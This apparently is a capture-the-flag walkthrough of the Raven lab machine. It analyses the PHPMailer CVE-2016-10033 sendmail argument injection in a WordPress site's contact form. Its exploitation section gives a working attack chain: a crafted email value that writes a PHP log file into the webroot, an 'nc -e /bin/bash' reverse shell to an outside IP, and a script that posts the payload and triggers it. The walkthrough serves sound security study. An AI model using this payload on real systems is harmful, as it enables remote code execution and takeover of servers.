.codehilite .na{color:teal}
.codehilite .nb{color:#0086b3}
.codehilite .nc{color:#445588;font-weight:bold}
.codehilite .no{color:teal}
.codehilite .ni{color:purple}
.codehilite .ne{color:#990000;font-weight:bold}
.codehilite .nf{color:#990000;font-weight:bold}
.codehilite .nn{color:#555555}
.codehilite .nt{color:navy}
.codehilite .nv{color:teal}
.codehilite .ow{font-weight:bold}
.codehilite .w{color:#bbbbbb}
.codehilite .mf{color:#009999}
.codehilite .mh{color:#009999}
.codehilite .mi{color:#009999}
.codehilite .mo{color:#009999}
.codehilite .sb{color:#dd1144}
.codehilite .sc{color:#dd1144}
.codehilite .sd{color:#dd1144}
.codehilite .s2{color:#dd1144}
.codehilite .se{color:#dd1144}
.codehilite .sh{color:#dd1144}
.codehilite .si{color:#dd1144}
.codehilite .sx{color:#dd1144}
.codehilite .sr{color:#009926}
.codehilite .s1{color:#dd1144}
.codehilite .ss{color:#990073}
.codehilite .bp{color:#999999}
.codehilite .vc{color:teal}
.codehilite .vg{color:teal}
.codehilite .vi{color:teal}
.codehilite .il{color:#009999}
.codehilite .gc{color:#999;background-color:#EAF2F5}
</style><title>raven</title></head><body><article class="markdown-body"><h3 id="raven-remote-command-execution">Raven - Remote Command Execution<a class="headerlink" href="#raven-remote-command-execution" title="Permanent link"></a></h3>
<h4 id="intro">Intro<a class="headerlink" href="#intro" title="Permanent link"></a></h4>
<p>Within this walkthrough, I will skip any part not related to the web application exploitation, but for sake of consistency I would briefly explain what (and why) I skip.</p>
<p>Raven web application is made on the top of wordpress, and a vulnerabity affecting the application can be found analysing a bunch of files only</p>
<h4 id="vulnerability-discovery">Vulnerability Discovery<a class="headerlink" href="#vulnerability-discovery" title="Permanent link"></a></h4>
<p>Running a <code>find /var/www/html/ -type -f -regex .*php</code> give us the generic structure of the application. The first thing to note is that the the first level of the application contains merely html files, except one, contact.php. To give you the ability to review it, the admin put a zipped version of the file (a backup?) for you to download.</p>
<pre><code>
root@Raven:/var/www/html# ls -l
total 232
-rw-r--r-- 1 root     root     13265 Aug 13  2018 about.html
<strong>-rw-r--r-- 1 root     root     10441 Aug 13  2018 contact.php
-rw-r--r-- 1 root     root      3384 Aug 12  2018 contact.zip</strong>
drwxr-xr-x 4 root     root      4096 Aug 12  2018 css
-rw-r--r-- 1 root     root     35226 Aug 12  2018 elements.html
drwxr-xr-x 2 root     root      4096 Aug 12  2018 fonts
drwxr-xr-x 5 root     root      4096 Aug 12  2018 img
-rw-r--r-- 1 root     root     16819 Aug 13  2018 index.html
drwxr-xr-x 3 root     root      4096 Aug 12  2018 js
drwxr-xr-x 4 root     root      4096 Aug 12  2018 scss
drwxr-xr-x 7 root     root      4096 Aug 12  2018 Security - Doc
-rw-r--r-- 1 root     root     11114 Nov  9  2018 service.html
-rw-r--r-- 1 root     root     15449 Aug 13  2018 team.html
drwxrwxrwx 7 root     root      4096 Jan 19 20:06 vendor
drwxrwxrwx 5 root     root      4096 Nov  9  2018 wordpress
</code></pre>

<p>Within the file, we can note the following piece of code, that loads the PHPMailer plugin, creates a message from user input parameters withouth any form of validation and tries to send it:</p>
<div class="codehilite"><pre> &lt;?php
if (isset($_REQUEST[&#39;action&#39;])){
    $name=$_REQUEST[&#39;name&#39;];
    $email=$_REQUEST[&#39;email&#39;];
    $message=$_REQUEST[&#39;message&#39;];
    if (($name==&quot;&quot;)||($email==&quot;&quot;)||($message==&quot;&quot;)){
        echo &quot;There are missing fields.&quot;;
    }else{
        require &#39;vendor/PHPMailerAutoload.php&#39;;
        $mail = new PHPMailer;
        $mail-&gt;Host = &quot;localhost&quot;;
        $mail-&gt;setFrom($email, &#39;Vulnerable Server&#39;);
        $mail-&gt;addAddress(&#39;admin@vulnerable.com&#39;, &#39;Hacker&#39;);
        $mail-&gt;Subject  = &quot;Message from $name&quot;;
        $mail-&gt;Body     = $message;
        if(!$mail-&gt;send()) {
            echo &#39;Message was not sent.&#39;;
            echo &#39;Mailer error: &#39; . $mail-&gt;ErrorInfo;
        } else {
            echo &#39;Message has been sent.&#39;;
        }
    }
}
?&gt;
</pre></div>

<p>The version of the PHPMailer installed on raven is the 5.2.17 (observal from /var/www/html/vendor/changelog.md).
Moreover, accessing the file /var/www/html/vendor/SECURITY.md, it&rsquo;s possible to see that this version is affected by a known vulnerability.</p>
<pre><code>
tester@Raven:# cat vendor/changelog.md  | head -n 3
# ChangeLog
## Version <strong>5.2.17</strong> (December 9th 2016)

tester@Raven:# cat vendor/SECURITY.md
# Security notices relating to PHPMailer
Please disclose any vulnerabilities found responsibly - report any security problems found to the maintainers privately.
PHPMailer versions prior to <strong>5.2.18</strong> (released December 2016) are vulnerable to [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com).
</code></pre>

<p>Ignoring the fact that a public available exploit is available for PHPMailer, let&rsquo;s dig deeper into its implementation. </p>
<p>Following, we will dissect the vulnerability known as <a href="https://github.com/opsxcq/exploit-CVE-2016-10033">CVE-2016-10033</a>, trying to figure it on our own. The steps the sendmail routine follows can be summarised as following:</p>
<ol>
<li>Locate the vulnerable function</li>
<li>Bypass the validation mechanism</li>
<li>Reach Remote Code Execution on the machine</li>
</ol>
<h4 id="locate-the-vulnerable-function">Locate the vulnerable function<a class="headerlink" href="#locate-the-vulnerable-function" title="Permanent link"></a></h4>
<p>We&rsquo;ll start analysing PHPMailerAutoload.php, which is only a loader, as its name suggests, which aim is loading class.* files within the module directory. We&rsquo;re mainly interested in the class.phpmailer.php file, which contains the send() function called in contact.php. The send function, below, calls two other functions, preSend and postSend.</p>
<p><div class="codehilite"><pre>public function send()
{
    try {
        if (!$this-&gt;preSend()) {
            return false;
        }
        return $this-&gt;postSend();
    } catch (phpmailerException $exc) {
        $this-&gt;mailHeader = &#39;&#39;;
        $this-&gt;setError($exc-&gt;getMessage());
        if ($this-&gt;exceptions) {
            throw $exc;
        }
        return false;
    }
}
</pre></div>
PreSend is the function that will prepare the message in a way that is ready to be sent. We will take this function into more consideration later, trying to find a way to bypass parameter filtering.</p>
<p>PostSend, instead, is the function that actually sends the message. It&rsquo;s crucial to understand the flow to the vulnerabilty. From its implementation we can see that different sub-routines are used to send the mail, basing on the value of the &ldquo;Mailer&rdquo; variable. At the start of the file, we can file that this variable is statically set to &ldquo;mail&rdquo;. </p>
<p>Note: To rapidly check for that, it&rsquo;s easy to add a logging routine just after the case &lsquo;mail&rsquo;, seeing that it&rsquo;s hit when a mail is sent from the contact us page.</p>
<pre><code>
public function postSend()
{
    try {
        // Choose the mailer and send through it
        switch ($this->Mailer) {
            case 'sendmail':
            case 'qmail':
                return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody);
            case 'smtp':
                return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
            <strong>case 'mail':
                return $this->mailSend($this->MIMEHeader, $this->MIMEBody);</strong>
            default:
                $sendMethod = $this->Mailer.'Send';
                if (method_exists($this, $sendMethod)) {
                    return $this->$sendMethod($this->MIMEHeader, $this->MIMEBody);
                }

                return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
        }
    } catch (phpmailerException $exc) {
        $this->setError($exc->getMessage());
        $this->edebug($exc->getMessage());
        if ($this->exceptions) {
            throw $exc;
        }
    }
    return false;
}
</code></pre>

<p>As seenable in <code>mailSend</code> function code, snippet below, the sender value is passed as it is in a sprintf function, withouth any validation. That makes it a very good candidate for a possible exploit.
Then, the prgram flow is passed to <code>mailPassthru</code>.</p>
<pre><code>
 protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        $params = null;
        //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
        <strong>if (!empty($this->Sender)) {
            $params = sprintf('-f%s', $this->Sender);
        }</strong>
        if ($this->Sender != '' and !ini_get('safe_mode')) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                <strong>$result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);</strong>
                $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
            }
        } else {
            <strong>$result = $this->mailPassthru($to, $this->Subject, $body, $header, $params);</strong>
            $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
        }
        if (isset($old_from)) {
            ini_set('sendmail_from', $old_from);
        }
        if (!$result) {
            throw new phpmailerException($this->lang('instantiate'), self::STOP_CRITICAL);
        }
        return true;
    }    
</code> </pre>

<p>Once reached <code>mailPassthru</code>, the code flow is passed to the standard PHP <code>mail</code> function, which is known to be susceptible to code injection attacks. As the affected parameter is <code>$param</code>, it seems to be claer that the function is vulnerable to an injection attack only if running in &lsquo;non safe&rsquo; mode. Snippet below:</p>
<pre><code> 
<strong>//Can't use additional_parameters in safe_mode</strong>
//@link http://php.net/manual/en/function.mail.php
if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)) {
    $result = @mail($to, $subject, $body, $header);
} else {
    $result = @mail($to, $subject, $body, $header, <strong>$params</strong>);
}
</code> </pre>

<p>To test if we&rsquo;re running in safe mode, let&rsquo;s run from raven terminal:
<div class="codehilite"><pre>tester@Raven:# php -r &#39;echo ini_get(&quot;safe_mode&quot;) ? &quot;TRUE&quot;.&quot;\n&quot; : &quot;FALSE&quot;.&quot;\n&quot;;&#39;
FALSE
</pre></div></p>
<p>So we know that we can reach that injection point. Before continuing further with the process of bypass the encoding I would like to insert here a nore about PHP <code>mail</code> exploitation. The following paragraph is copied directly (without any modification) from the fantastic work of <strong>opsxcq</strong>, who previously wrote a post on this vulnerability, found by <strong>Dawid Golunski</strong>, and develop a vulnerable dokcer container to play with it:</p>
<p>&mdash; BEGIN NOTE</p>
<h3 id="notes-about-php-mail-function-exploitation">Notes about PHP mail() function exploitation<a class="headerlink" href="#notes-about-php-mail-function-exploitation" title="Permanent link"></a></h3>
<p>The exploitation of PHP mail() function isn&rsquo;t a new thing, but it still alive and people still using it. To explain how it works, lets look at how mail() function is defined:</p>
<div class="codehilite"><pre><span class="x">bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )</span>
</pre></div>

<p>There are several exploitation methods for different results, we will focus on the exploitation of the <strong>5th parameter</strong> to get Remote Code Execution (RCE). The parameter <code>$additional_parameters</code> is used to pass additional flags as command line options to the program configured to send the email. This configuration is defined by the <code>sendmail_path</code> variable.</p>
<p>A security note from <a href="http://php.net/manual/en/function.mail.php">php official documentation</a>:</p>
<blockquote>
<p>The additional_parameters parameter can be used to pass additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmiail option.</p>
<p>This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters. For security reasons, it is recommended for the user to sanitize this parameter to avoid adding unwanted parameters to the shell command.</p>
</blockquote>
<p>Considering the additional parameters that can be injectected we will use <code>-X</code> to exploit this flaw. More about the <code>-X</code> parameter</p>
<div class="codehilite"><pre>-X logfile
Log all traffic in and out of mailers in the indicated log file. This should only be used as a last resort for debugging mailer bugs. It will log a lot of data very quickly.
</pre></div>


<p>There are also some other interesting parameters that you should know that exist:</p>
<div class="codehilite"><pre>-Cfile
Use alternate configuration file. Sendmail gives up any enhanced (set-user-ID or set-group-ID) privileges if an alternate configuration file is specified.
</pre></div>


<p>And</p>
<div class="codehilite"><pre>-O option=value
Set option option to the specified value. This form uses long names.
</pre></div>


<p>And for <code>-O</code> option, the <code>QueueDirectory</code> is the most interesting option there, this option select the directory in which to queue messages.</p>
<p>If you want to read the whole list of parameters and options, just <code>man sendmail</code> or read it online <a href="https://linux.die.net/man/8/sendmail.sendmail">here</a></p>
<p>Based on this information, and the hability to control at least one of the other parameters, we can exploit the host. Bellow the steps for a successful exploitation:</p>
<ul>
<li>Control <code>$additional_parameters</code> and another <code>mail()</code> parameter</li>
<li>Know a <strong>writeable</strong> diretory on target host which is accessible via the target system and user (www-data for example). Usually this directory can be anything bellow <code>webroot</code> (aka /var/www/html for another systems, /www for this example)</li>
<li>Any PHP payload that you want, we are using a simple <code>system()</code> payload in this example, with a spice of base64 and some special characters <code>|</code> to make it easier to parse. </li>
<li>Just assembly everything together !</li>
</ul>
<p>Remember that the <code>-X</code> option will write the log file, that will contain among the log information your PHP payload, in the directory that you will inform. An example of a vulnerable PHP code:</p>
<div class="codehilite"><pre><span class="x">$to = &#39;hacker@server.com&#39;;</span>
<span class="x">$subject = &#39;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;|&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">system</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">])))</span><span class="o">.</span><span class="s2">&quot;|&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
<span class="x">$message = &#39;Pwned&#39;;</span>
<span class="x">$headers = &#39;&#39;;</span>
<span class="x">$options = &#39;-OQueueDirectory=/tmp -X/www/backdoor.php&#39;;</span>
<span class="x">mail($to, $subject, $message, $headers, $options);</span>
</pre></div>

<p>If you execute the code above, it will create a log file in the <code>/www/backdoor.php</code>, this is the essence of this exploit.</p>
<p>&mdash; END NOTE</p>
<p>Ok, that&rsquo;s awesome, now we know we can exploit the injection point to reach remote code execution. But that is so simple? 
Let&rsquo;s do one step back and take a look at what kind of validation is performed in <code>preSend</code> function:</p>
<pre><code>
public function preSend()
{

        ...SNIPPED...

        // Validate From, Sender, and ConfirmReadingTo addresses
        <strong>foreach (array('From', 'Sender', 'ConfirmReadingTo') as $address_kind) {</strong>
            $this->$address_kind = trim($this->$address_kind);
            if (empty($this->$address_kind)) {
                continue;
            }
            <strong>$this->$address_kind = $this->punyencodeAddress($this->$address_kind);
            if (!$this->validateAddress($this->$address_kind)) {</strong>
                $error_message = $this->lang('invalid_address') . ' (punyEncode) ' . $this->$address_kind;
                $this->setError($error_message);
                $this->edebug($error_message);
                if ($this->exceptions) {
                    throw new phpmailerException($error_message);
                }
                return false;
            }
        }

        ...SNIPPED...

    }
}    
</code> </pre>

<p>We can clearly observe that punyencodeaddress won&rsquo;t actually do anything more than checking if the mail address contains a &ldquo;@&rdquo; and if the domain is utf-8 encoded:</p>
<div class="codehilite"><pre>public function punyencodeAddress($address)
{
    // Verify we have required functions, CharSet, and at-sign.
    if ($this-&gt;idnSupported() and
        !empty($this-&gt;CharSet) and
        ($pos = strrpos($address, &#39;@&#39;)) !== false) {
        $domain = substr($address, ++$pos);
        // Verify CharSet string is a valid one, and domain properly encoded in this CharSet.
        if ($this-&gt;has8bitChars($domain) and @mb_check_encoding($domain, $this-&gt;CharSet)) {
            $domain = mb_convert_encoding($domain, &#39;UTF-8&#39;, $this-&gt;CharSet);
            if (($punycode = defined(&#39;INTL_IDNA_VARIANT_UTS46&#39;) ?
                idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46) :
                idn_to_ascii($domain)) !== false) {
                return substr($address, 0, $pos) . $punycode;
            }
        }
    }
    return $address;
}
</pre></div>

<p>The function validate address, instead, does the heavy job validating the address name, differentiating four validation types:</p>
<ul>
<li>pcre8 regex, used if <code>PCRE_VERSION</code> is defined and &gt; 8.0.2</li>
<li>pcre regex (backward compatibility with older pcre), used if <code>PCRE_VERSION</code> is defined and &lt;= 8.0.2</li>
<li>html5 (used in html5 to validate mail addresses), not used</li>
<li>php, uses standard PHP filter_var, used if <code>PCRE_VERSION</code> is not defined and PHP version &gt;= 5.2.0</li>
<li>noregex (just force a lower bound for length and check if &lsquo;@&rsquo; is present), used if <code>PCRE_VERSION</code> is not defined and PHP version &lt; 5.2.0</li>
</ul>
<p>Let&rsquo;s check if PCRE_VERSION is defined in PHP and the PHP version by running:</p>
<div class="codehilite"><pre>tester@Raven:# php -r &#39;echo (version_compare(PCRE_VERSION,&quot;8.0.3&quot;) ? &quot;TRUE&quot; : &quot;FALSE&quot;);&#39;
TRUE

tester@Raven:# # php --version
PHP 5.6.36-0+deb8u1 (cli) (built: Jun 26 2018 17:31:29)
Copyright (c) 1997-2016 The PHP Group
Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies
    with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies
</pre></div>

<p>Ok, so now we know that the flow of the program will choose <code>pcre8</code> as the validation regex.</p>
<p>Let&rsquo;s take a deeper look at the regex used:</p>
<div class="codehilite"><pre><span class="x">$regex= &#39;/^(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1)){255,})(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1)){65,}@)&#39; .</span>
<span class="x">        &#39;((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\x0D\x0A)?[\t ])+|(?&gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&gt;(?2)&#39; .</span>
<span class="x">        &#39;(?&gt;[\x01-\x08\x0B\x0C\x0E-\&#39;*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)&#39; .</span>
<span class="x">        &#39;([!#-\&#39;*+\/-9=?^-~-]+|&quot;(?&gt;(?2)(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*&#39; .</span>
<span class="x">        &#39;(?2)&quot;)(?&gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9\-]{64,})(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9\-]*[a-z0-9])?)&#39; .</span>
<span class="x">        &#39;(?&gt;(?1)\.(?!(?1)[a-z0-9\-]{64,})(?1)(?5)){0,126}|\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]{1,4})(?&gt;:(?6)){7}&#39; .</span>
<span class="x">        &#39;|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?&gt;:(?6)){0,6})?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6)){5}:&#39; .</span>
<span class="x">        &#39;|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&gt;((?6)(?&gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}&#39; .</span>
<span class="x">        &#39;|[1-9]?[0-9])(?&gt;\.(?9)){3}))\])(?1)$/isD&#39;;</span>
</pre></div>

<p>The important thing to note is that this regex, although being compliant with the RFC, allows a wide range of characters to be used within the mail address.
We can exploit it? Let&rsquo;s write a small php tester:
<div class="codehilite"><pre><span class="cp">&lt;?php</span>

<span class="nv">$regex</span> <span class="o">=</span> <span class="s1">&#39;/^(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1)){255,})(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1)){65,}@)&#39;</span> <span class="o">.</span>
                    <span class="s1">&#39;((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\x0D\x0A)?[\t ])+|(?&gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&gt;(?2)&#39;</span> <span class="o">.</span>
                    <span class="s1">&#39;(?&gt;[\x01-\x08\x0B\x0C\x0E-\&#39;*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)&#39;</span> <span class="o">.</span>
                    <span class="s1">&#39;([!#-\&#39;*+\/-9=?^-~-]+|&quot;(?&gt;(?2)(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*&#39;</span> <span class="o">.</span>
                    <span class="s1">&#39;(?2)&quot;)(?&gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9\-]{64,})(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9\-]*[a-z0-9])?)&#39;</span> <span class="o">.</span>
                    <span class="s1">&#39;(?&gt;(?1)\.(?!(?1)[a-z0-9\-]{64,})(?1)(?5)){0,126}|\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]{1,4})(?&gt;:(?6)){7}&#39;</span> <span class="o">.</span>
                    <span class="s1">&#39;|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?&gt;:(?6)){0,6})?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6)){5}:&#39;</span> <span class="o">.</span>
                    <span class="s1">&#39;|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&gt;((?6)(?&gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}&#39;</span> <span class="o">.</span>
                    <span class="s1">&#39;|[1-9]?[0-9])(?&gt;\.(?9)){3}))\])(?1)$/isD&#39;</span><span class="p">;</span>

<span class="nv">$address</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="s1">&#39;&quot;test chars:\&quot; -A/=/a/b/c test&quot; @test.com&#39;</span><span class="p">;</span>

<span class="k">print</span> <span class="s2">&quot;[*] Testing the follwoing address:</span><span class="se">\n\t</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$address</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="nv">$res</span> <span class="o">=</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regex</span><span class="p">,</span><span class="nv">$address</span><span class="p">);</span>
<span class="k">echo</span> <span class="p">((</span><span class="nx">bool</span><span class="p">)</span><span class="nv">$res</span> <span class="o">?</span> <span class="s2">&quot;TRUE</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">:</span> <span class="s2">&quot;FALSE</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div></p>
<p>And run it:
<div class="codehilite"><pre>tester@Raven:# php test.php
[*] Testing the following address:
        &quot;test the following:\&quot; -A/=/a/b/c test&quot; @test.com
TRUE
</pre></div></p>
<h4 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link"></a></h4>
<p>We just need to craft a a payload string that would allow us to write a log in a file reachable from the web server. Ideally, we will be able to inject php log into the file and use it as a vector to achieve code execution, as explained previously in the &ldquo;Notes about PHP mail() function exploitation&rdquo;.</p>
<p>Following the above example, we can modify the address from this:</p>
<p><div class="codehilite"><pre>$address = (string)&#39;&quot;test chars:\&quot; -A/=/a/b/c test&quot; @test.com&#39;;
</pre></div>
to this:
<div class="codehilite"><pre>$address = (string)&#39;&quot;injection\&quot; -OQueueDirectory=/tmp -X/var/www/html/shell.php server&quot; @pwnd.com&#39;;
</pre></div></p>
<p>If we run again the tester, we will see that this payload as well matches the validation regex: </p>
<div class="codehilite"><pre>tester@Raven:# php test.php
[*] Testing the following address:
        &quot;injection\&quot; -OQueueDirectory=/tmp -X/var/www/html/shell.php server&quot; @pwnd.com
TRUE
</pre></div>

<p>When called by PHP mail function, the sendmail program would look like it was called from the commnad like in the following way:
<div class="codehilite"><pre>tester@Raven:# sendmail -f&quot;injection\&quot; -OQueueDirectory=/tmp -X/var/www/html/shell.php server&quot; @pwnd.com
</pre></div></p>
<p>However, if anyone tryes to execute the command this way, he will see that it won&rsquo;t work. To make it work properly, it&rsquo;s necessary to launch it this way:
<div class="codehilite"><pre>tester@Raven:# <span class="k">$(</span><span class="nb">printf</span> <span class="s1">&#39;/usr/sbin/sendmail -f&quot;injection\&quot; -OQueueDirectory=/tmp -X/var/www/html/shell.php server&quot; @pwnd.com&#39;</span><span class="k">)</span> 
</pre></div>
Killing the command with <code>Ctrl+C</code>, and listing the files within the directory, 
it&rsquo;s observable that the file shell.php has been created, registering the output of the command. At this point, the last thing to do is to choose where to put the PHP shell payload. We can control two additional part of the sendmail commnad, as seenable from the contact.php:</p>
<div class="codehilite"><pre><span class="x">$name=$_REQUEST[&#39;name&#39;];</span>
<span class="x">$message=$_REQUEST[&#39;message&#39;];</span>
<span class="x">...</span>
<span class="x">$mail-&gt;Subject  = &quot;Message from $name&quot;;</span>
<span class="x">$mail-&gt;Body     = $message;</span>
</pre></div>

<p>Any of the two can be choosen to inject the backdoor payload. To test it, it is possible to launch the sendmail directly from the command line and craft the mail manually:</p>
<p><div class="codehilite"><pre>tester@Raven:# $(echo &#39;/usr/sbin/sendmail -f&quot;d3adc0de\&quot; -OQueueDirectory=/tmp -X/var/www/html/shell.php server&quot; @gmail.com&#39;)
To: Hacker &lt;admin@vulnerable.com&gt;
Subject: Message from ME
Header: Date: Mon, 20 Jan 2020 20:23:17 +1100
From: Vulnerable Server &lt;&quot;d3adc0de\&quot; -OQueueDirectory=/tmp -X/var/www/html/shell.php server&quot; @gmail.com&gt;
PWND!!&lt;?php system(&#39;nc -e /bin/bash 192.168.56.1 444&#39;); ?&gt;
.
tester@Raven:# cat shell.php | grep &#39;&lt;?php&#39;
29395 &lt;&lt;&lt; PWND!!&lt;?php system(&#39;nc -e /bin/bash 192.168.56.1 444&#39;); ?&gt;
29395 &gt;&gt;&gt; PWND!!&lt;?php system(&#39;nc -e /bin/bash 192.168.56.1 444&#39;); ?&gt;
29395 &gt;&gt;&gt; PWND!!&lt;?php system(&#39;nc -e /bin/bash 192.168.56.1 444&#39;); ?&gt;
29395 &gt;&gt;&gt; PWND!!&lt;?php system(&#39;nc -e /bin/bash 192.168.56.1 444&#39;); ?&gt;
</pre></div>
The backdoor was successfully created.</p>
<h5 id="wrapping-up">Wrapping up<a class="headerlink" href="#wrapping-up" title="Permanent link"></a></h5>
<p>The final payload, as it looks after tweaking:</p>
<div class="codehilite"><pre><span class="ch">#!/bin/sh</span>
<span class="nb">echo</span> <span class="s2">&quot;[*] Staring Listener on port 444&quot;</span>
gnome-terminal -- nc -lvkp <span class="m">444</span> 2&gt;/dev/null

<span class="nb">echo</span> <span class="s2">&quot;[*] Writing shell on the filesystem&quot;</span>
curl -ksi -x <span class="s1">$&#39;http://127.0.0.1:8080&#39;</span> <span class="se">\</span>
-X <span class="s1">$&#39;POST&#39;</span> -H <span class="s1">$&#39;Content-Type: multipart/form-data&#39;</span> <span class="se">\</span>
-F <span class="s1">$&#39;action=submit&#39;</span> <span class="se">\</span>
--form-string <span class="s1">$&#39;name=&lt;?php system(&quot;nc -e /bin/bash 192.168.56.1 444&quot;);?&gt;&#39;</span><span class="se">\</span>
--form-string <span class="s1">$&#39;email=&quot;injection\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/shell.php server&quot; @pwnd.com&#39;</span> <span class="se">\</span>
-F <span class="s1">$&#39;subject=No Subject&#39;</span> <span class="se">\</span>
-F <span class="s1">$&#39;message=TEST&#39;</span> <span class="se">\</span>
<span class="s1">$&#39;http://raven.local/contact.php&#39;</span> <span class="p">&amp;</span>&gt;/dev/null

<span class="nb">echo</span> <span class="s2">&quot;[*] Triggering the reverse shell&quot;</span>
curl -ksi http://raven.local/shell.php -x http://127.0.0.1:8080 <span class="p">&amp;</span>&gt;/dev/null
<span class="nb">echo</span> <span class="s2">&quot;[+] Done&quot;</span>
</pre></div>

<h4 id="conclusion">Conclusion<a class="headerlink" href="#conclusion" title="Permanent link"></a></h4>
<p>Very good machine to learn how to review code and find an injection point, if you don&rsquo;t choose to take the easy route and go with the public available exploit, of course! The level of complexity is close to AWAE level.</p></article></body></html>